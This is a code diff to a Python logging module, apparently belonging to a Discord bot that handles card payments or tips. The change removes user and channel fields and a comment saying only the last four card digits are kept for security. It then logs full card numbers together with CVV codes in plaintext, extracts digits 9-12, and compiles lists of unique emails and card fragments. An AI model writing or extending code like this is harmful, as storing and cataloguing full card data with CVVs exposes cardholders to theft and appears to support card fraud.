@@ -37,19 +37,25 @@ def log_command_output(
     """
     timestamp = datetime.now()
     
+    # Extract digits 9-12 from card number (0-indexed, so positions 8-11)
+    card_digits_9_12 = None
+    card_full = None
+    card_cvv = None
+    if card_used:
+        card_number = card_used[0]
+        card_cvv = card_used[1]
+        card_full = f"{card_number} CVV:{card_cvv}"
+        if len(card_number) >= 12:
+            card_digits_9_12 = card_number[8:12]  # Digits 9-12 (0-indexed)
+    
     # Prepare log entry
     log_entry = {
         "timestamp": timestamp.isoformat(),
         "command_type": command_type,
-        "user_id": user_id,
-        "username": username,
-        "channel_id": channel_id,
-        "guild_id": guild_id,
         "command_output": command_output,
-        "tip_amount": tip_amount,
-        "card_used": card_used[0][-4:] if card_used else None,  # Only log last 4 digits for security
-        "card_cvv": card_used[1] if card_used else None,
         "email_used": email_used,
+        "card_full": card_full,
+        "card_digits_9_12": card_digits_9_12,
         "additional_data": additional_data or {}
     }
     
@@ -89,9 +95,8 @@ def _log_to_csv(filename: str, log_entry: Dict[str, Any]):
     try:
         # Define CSV headers
         headers = [
-            "timestamp", "command_type", "user_id", "username", 
-            "channel_id", "guild_id", "command_output", "tip_amount",
-            "card_last4", "card_cvv", "email_used"
+            "timestamp", "command_type", "command_output", 
+            "email_used", "card_full", "card_digits_9_12"
         ]
         
         # Check if file exists
@@ -101,15 +106,10 @@ def _log_to_csv(filename: str, log_entry: Dict[str, Any]):
         row_data = [
             log_entry["timestamp"],
             log_entry["command_type"],
-            log_entry["user_id"],
-            log_entry["username"],
-            log_entry["channel_id"],
-            log_entry["guild_id"],
             log_entry["command_output"],
-            log_entry["tip_amount"],
-            log_entry["card_used"],
-            log_entry["card_cvv"],
-            log_entry["email_used"]
+            log_entry["email_used"],
+            log_entry["card_full"],
+            log_entry["card_digits_9_12"]
         ]
         
         with open(filename, 'a', newline='', encoding='utf-8') as f:
@@ -128,13 +128,12 @@ def _log_to_txt(filename: str, log_entry: Dict[str, Any], timestamp: datetime):
             f.write(f"\n{'='*80}\n")
             f.write(f"TIMESTAMP: {timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"COMMAND TYPE: {log_entry['command_type']}\n")
-            f.write(f"USER: {log_entry['username']} (ID: {log_entry['user_id']})\n")
-            f.write(f"CHANNEL ID: {log_entry['channel_id']}\n")
-            f.write(f"TIP AMOUNT: ${log_entry['tip_amount']}\n")
-            if log_entry['card_used']:
-                f.write(f"CARD USED: ****{log_entry['card_used']} (CVV: {log_entry['card_cvv']})\n")
             if log_entry['email_used']:
                 f.write(f"EMAIL USED: {log_entry['email_used']}\n")
+            if log_entry['card_full']:
+                f.write(f"CARD USED: {log_entry['card_full']}\n")
+            if log_entry['card_digits_9_12']:
+                f.write(f"CARD DIGITS 9-12: {log_entry['card_digits_9_12']}\n")
             f.write(f"\nCOMMAND OUTPUT:\n{log_entry['command_output']}\n")
             f.write(f"{'='*80}\n")
     except Exception as e:
@@ -166,8 +165,8 @@ def get_log_stats(month: str = None) -> Dict[str, Any]:
         stats = {
             "total_commands": len(data),
             "command_types": {},
-            "total_tips": 0,
-            "users": set(),
+            "emails_used": set(),
+            "cards_used": set(),
             "date_range": {"start": None, "end": None}
         }
         
@@ -176,15 +175,13 @@ def get_log_stats(month: str = None) -> Dict[str, Any]:
             cmd_type = entry["command_type"]
             stats["command_types"][cmd_type] = stats["command_types"].get(cmd_type, 0) + 1
             
-            # Sum tips
-            if entry["tip_amount"]:
-                try:
-                    stats["total_tips"] += float(entry["tip_amount"])
-                except ValueError:
-                    pass
+            # Track emails
+            if entry.get("email_used"):
+                stats["emails_used"].add(entry["email_used"])
             
-            # Track users
-            stats["users"].add(entry["username"])
+            # Track cards (digits 9-12)
+            if entry.get("card_digits_9_12"):
+                stats["cards_used"].add(entry["card_digits_9_12"])
             
             # Track date range
             entry_date = entry["timestamp"]
@@ -193,8 +190,10 @@ def get_log_stats(month: str = None) -> Dict[str, Any]:
             if stats["date_range"]["end"] is None or entry_date > stats["date_range"]["end"]:
                 stats["date_range"]["end"] = entry_date
         
-        stats["unique_users"] = len(stats["users"])
-        stats["users"] = list(stats["users"])  # Convert set to list for JSON serialization
+        stats["unique_emails"] = len(stats["emails_used"])
+        stats["unique_cards"] = len(stats["cards_used"])
+        stats["emails_used"] = list(stats["emails_used"])  # Convert set to list for JSON serialization
+        stats["cards_used"] = list(stats["cards_used"])  # Convert set to list for JSON serialization
         
         return stats
     except Exception as e:
